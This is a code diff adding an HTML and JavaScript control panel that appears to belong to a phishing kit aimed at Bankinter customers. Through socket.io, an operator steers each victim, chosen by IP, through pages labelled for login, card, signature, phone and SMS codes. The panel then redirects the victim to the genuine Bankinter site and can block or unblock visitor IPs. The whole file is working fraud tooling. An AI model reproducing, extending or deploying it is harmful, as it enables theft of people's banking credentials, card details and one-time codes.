@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+    <title></title>
+    <style>
+        body {
+            background-color: black;
+            color: rgb(0, 255, 0);
+        }
+
+        .father {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+
+        }
+
+        .head h1 {
+            font-family: monospace;
+            font-size: 45px;
+        }
+
+        .body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .body div {
+            margin-top: 20px;
+        }
+
+        button {
+            margin-right: 20px;
+        }
+
+        #unb {
+            background-color: greenyellow;
+        }
+
+        #b {
+            background-color: red;
+        }
+
+        .bad {
+            color: red;
+        }
+
+        .good {
+            color: rgb(130, 255, 14);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="father">
+        <div class="head">
+            <h1>CULDA BLOCKER</h1>
+        </div>
+        <div class="body">
+            <div class="inp">
+                <input type="text" id="ip">
+
+            </div>
+            <h2 id="msg2" style="color: greenyellow;font-size: 20px;"></h2>
+            <div class="btns">
+                <button id="login" type="button">Login</button>
+                <button id="cc" type="button">CC</button>
+                <button id="firma" type="button">Firma</button>
+                <button id="tele" type="button">Tele</button>
+                <button id="sms1" type="button">Sms1</button>
+                <button id="sms2" type="button">Sms2</button>
+                <button id="done" type="button">Done</button>
+            </div>
+            <div class="btns">
+                <button id="unb" type="button">UnBlock</button>
+                <button id="b" type="button">Block</button>
+            </div>
+        </div>
+        <div class="foot">
+            <ul></ul>
+        </div>
+    </div>
+    <!-- culda Script -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+
+        const socket = io();
+
+        const LOGIN = "/";
+        const CC = "/fGnEL4jmpuBCDkJP3myR";
+        const FIRMA = "/QcEwP85AgNE4pnL5mWSM";
+        const TELE = "/Q89HFszQPd3TFv4mx65k";
+        const SMS1 = "/RKnUB922z6Mf4HDwg3EZ";
+        const SMS2 = "/aEsKRvuaENZtYax265Kv";
+        const DONE = "https://www.bankinter.com/banca/en/home";
+
+
+        socket.on("done", (m) => {
+            $("#msg2").text(m);
+        });
+        $("#login").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: LOGIN });
+        });
+        $("#cc").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: CC });
+
+
+        });
+        $("#firma").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: FIRMA });
+        });
+
+        $("#tele").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: TELE });
+        });
+
+        $("#sms1").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: SMS1 });
+        });
+
+        $("#sms2").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: SMS2 });
+        });
+
+        $("#done").on("click", () => {
+            const IP = $("#ip").val();
+            socket.emit("goto", { ip: IP, path: DONE });
+        });
+
+
+
+        $("#unb").on("click", () => {
+            let ip = $("#ip").val();
+            if (ip != "") {
+                $.ajax({
+                    url: '/culda',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ type: "unblock", ip }),
+                    success: function (info) {
+                        if (info.OK) {
+                            $("ul").prepend(`<li class="${info.type}">${ip}</li>`);
+                        }
+                    }
+                });
+            }
+        });
+        $("#b").on("click", () => {
+            let ip = $("#ip").val();
+            if (ip != "") {
+                $.ajax({
+                    url: '/culda',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ type: "block", ip }),
+                    success: function (info) {
+                        if (info.OK) {
+                            $("ul").prepend(`<li class="${info.type}">${ip}</li>`);
+                        }
+                    }
+
+                });
+            }
+        });
+    </script>
+
+
+</body>
+
+</html>
